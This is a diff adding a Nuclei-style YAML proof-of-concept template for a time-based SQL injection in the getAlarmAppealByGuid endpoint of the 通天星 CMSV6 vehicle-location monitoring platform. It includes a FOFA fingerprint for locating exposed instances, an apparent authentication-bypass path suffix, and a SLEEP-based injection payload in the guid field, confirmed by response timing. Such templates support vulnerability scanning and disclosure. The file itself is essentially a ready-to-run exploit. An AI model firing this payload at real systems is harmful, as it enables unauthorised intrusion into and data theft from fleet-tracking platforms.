@@ -1,0 +1,55 @@
+id: poc-yaml-g-sky-getalarmappealbyguid-sqli
+info:
+  name: 通天星CMS V6车载定位监控平台 getAlarmAppealByGuid SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: cmsv6
+    fofa: body="/808gps/"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/808gps/login.html"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/808gps/"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/alarm_appeal/getAlarmAppealByGuid;downloadLogger.action"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP({{t1}})))PITq) AND ('qhqF'='qhqF
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"infos\":\"\""
+        part: body
+      - type: word
+        words:
+          - "filename="
+        part: header
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
+      - type: status
+        status:
+          - 200
